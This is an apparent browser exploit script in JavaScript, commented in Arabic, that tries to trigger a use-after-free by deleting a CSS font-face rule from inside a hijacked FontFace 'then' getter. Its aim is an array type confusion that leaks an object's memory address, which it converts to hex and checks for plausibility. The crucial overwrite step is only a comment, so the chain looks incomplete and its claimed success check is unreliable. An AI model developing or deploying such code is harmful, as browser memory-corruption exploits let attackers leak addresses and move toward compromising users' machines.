/**
 * [EXPLOIT SCRIPT] - Type Confusion Engine
 * الوظيفة: إجبار المحرك على خلط أنواع المصفوفات لتسريب العناوين
 */

ssa("[*] بدء محرك الـ Type Confusion...");

function runTypeConfusion() {
    try {
        // 1. إنشاء مصفوفتين متجاورتين
        let floatArray = [1.1, 2.2, 3.3, 4.4];
        let objectArray = [{a: 1}]; 

        // 2. الثغرة: سنقوم بـ Trigger للـ UAF لمحاولة دمج الـ Butterfly الخاص بهما
        const style = document.createElement('style');
        style.id = 'c_style';
        style.innerHTML = '@font-face { font-family: y; src: url(nonexistent-font.woff); }';
        document.head.appendChild(style);

        let testFace = new FontFace('y', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(testFace);
        void testFace.loaded;

        let triggered = false;

        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!triggered) {
                    triggered = true;
                    document.getElementById('c_style').sheet.deleteRule(0);
                    
                    // هنا التلاعب: نريد الكتابة فوق الـ Butterfly الخاص بـ floatArray
                    // لكي يشير إلى بيانات الـ objectArray
                }
                return undefined;
            }
        });

        document.fonts.load('1em y', 'AB');

        setTimeout(() => {
            // التحقق: إذا نجحنا، قراءة floatArray[0] ستعطينا "عنوان" الكائن
            let leaked = floatArray[0]; 
            ssa("[*] القيمة المستخرجة من مصفوفة الأرقام: " + leaked);
            
            // تحويل الرقم إلى عنوان (Hex)
            let buf = new ArrayBuffer(8);
            new Float64Array(buf)[0] = leaked;
            let addr = new BigUint64Array(buf)[0];
            
            ssa("[+] العنوان الخام المستخرج: 0x" + addr.toString(16));
            
            if (addr > 0x10000n && addr < 0xffffffffffffn) {
                ssa("[!!!] [SUCCESS] تم فك تشفير عنوان كائن حقيقي عبر Type Confusion!");
            } else {
                ssa("[-] لا يزال العنوان غير منطقي.");
            }
        }, 1000);

    } catch (e) {
        ssa("[-] خطأ: " + e.message);
    }
}

document.getElementById('exec-btn').addEventListener('click', runTypeConfusion);
